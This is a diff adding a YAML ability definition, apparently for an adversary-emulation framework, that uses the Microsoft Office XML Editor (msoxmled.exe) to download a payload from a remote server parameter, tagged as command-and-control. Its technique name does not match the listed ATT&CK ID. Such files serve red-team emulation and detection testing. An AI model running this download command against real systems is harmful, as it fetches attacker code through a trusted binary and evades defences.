@@ -1,0 +1,23 @@
+- id: ab2caf44-59c9-7d5c-8a7f-6423bcbf2426
+  name: msoxmled.exe - Downloads payload from remote server using the Microsoft Office
+    XML Editor.
+  description: Downloads payload from remote server using the Microsoft Office XML
+    Editor.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'msoxmled.exe /verb open #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Bogac Kaya
+  created: '2025-08-22'
+  modified: '2025-08-22'
+  operating_system: Windows All Versions
